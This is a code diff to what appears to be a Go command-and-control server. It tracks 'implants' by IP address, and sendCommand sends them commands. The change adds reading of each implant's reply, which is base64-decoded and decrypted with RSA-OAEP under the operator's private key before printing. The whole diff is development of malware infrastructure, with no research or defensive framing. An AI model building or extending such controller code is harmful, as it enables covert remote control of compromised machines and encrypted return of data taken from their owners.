@@ -1,10 +1,14 @@
 package main
 
 import (
+	"bufio"
+	"crypto/rand"
 	"crypto/rsa"
+	"crypto/sha256"
 	"crypto/tls"
 	"crypto/x509"
 	"database/sql"
+	"encoding/base64"
 	"encoding/pem"
 	"fmt"
 	"github.com/peterh/liner"
@@ -156,5 +160,25 @@ func sendCommand(ip, command string) {
 		mutex.Lock()
 		delete(implants, ip)
 		mutex.Unlock()
+		return
 	}
+
+	reader := bufio.NewReader(conn)
+	encResp, err := reader.ReadString('\n')
+	if err != nil {
+		fmt.Println("[-] Failed to read response")
+		return
+	}
+	encResp = strings.TrimSpace(encResp)
+	cipherData, err := base64.StdEncoding.DecodeString(encResp)
+	if err != nil {
+		fmt.Println("[-] Invalid response encoding")
+		return
+	}
+	plain, err := rsa.DecryptOAEP(sha256.New(), rand.Reader, privateKey, cipherData, nil)
+	if err != nil {
+		fmt.Println("[-] Decryption failed")
+		return
+	}
+	fmt.Printf("[+] Response from %s: %s\n", ip, string(plain))
 }
